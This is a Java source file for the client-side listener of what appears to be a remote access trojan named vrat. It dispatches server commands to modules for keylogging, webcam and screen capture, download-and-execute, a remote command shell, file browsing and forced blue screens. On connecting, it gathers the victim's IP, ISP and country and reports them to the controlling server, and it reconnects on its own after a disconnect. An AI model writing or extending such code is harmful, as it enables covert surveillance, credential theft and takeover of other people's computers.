package vrat.client;

import com.jmr.wrapper.common.Connection;
import com.jmr.wrapper.common.listener.SocketListener;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.URL;
import java.net.URLConnection;
import vrat.packets.PcSpecs;
import java.util.ArrayList;

/*
 * @author vrmg
 */

public class ClientListener implements SocketListener {

    /*
     * When server sends an instruction
     */
    @Override
    public void received(Connection con, Object object) {
        if (object instanceof ArrayList){
            ArrayList recived = (ArrayList) object;
			
            switch((String) recived.get(0)){
                case "BlueScreen":
                    new BlueScreen(recived);
                    break;
                case "Chat":
                    new Chat(recived);
                    break;
                case "CmdT":
                    new CmdT(recived);
                    break;
                case "DownExec":
                    new DownExec(recived);
                    break;
                case "FileExplorer":
                    new FileExplorer(recived);
                    break;
                case "Keylogger":
                    new Keylogger(recived);
                    break;
                case "Popup":
                    new Popup(recived);
                    break;
                case "ScreenCapture":
                    new ScreenCapture(recived);
                    break;
                case "TaskManager":
                    new TaskManager(recived);
                    break;
                case "Uninstall":
                    Startup start = new Startup();
					start.uninstall();
                    break;
                case "WebBrowser":
                    new Thread(new WebBrowser(recived)).start();
                    break;
                case "WebcamCapture":
                    new WebcamCapture(recived);
                    break;
                default:
                    System.out.println("Error getting command");
                    break;
            }
        }
    }

    /*
     * Cconnected to server
     */
    @Override
    public void connected(Connection con) {
        System.out.println("Connected to server");
		
		/*
		* Testing if input returned "error"
		*/
		ClientListener cl = new ClientListener();
		String input = cl.getInput();
		while (input.contains("error")){
			System.out.println("Get input error");
		}
		PcSpecs specs = new PcSpecs(input);
        con.sendTcp(specs);
		System.out.println("Sent information to server");
    }

    /*
     * Disconnected from server
     */
    @Override
    public void disconnected(Connection con) {
        System.out.println("Disconnected from server - trying to reconnect");
		Config c = new Config();
		c.startConnectThread();
    }
	
	/*
     * Gets ip, isp and country from telize.com/geoip and passes them to pcSpecs
     */
    private String getInput() {
        try {
            URL url = new URL("http://www.telize.com/geoip");
            URLConnection connection = url.openConnection();
            BufferedReader in = new BufferedReader(new
            InputStreamReader(connection.getInputStream()));
			String input;
            while ((input = in.readLine()) != null) {
                return input;
            }
            in.close();
        } 
		catch (Exception e) {
            e.printStackTrace();
            System.out.println("Error getting input - check internet connection");
			//Need to find a way to restart the connection
        }
		return "error";
	}
}
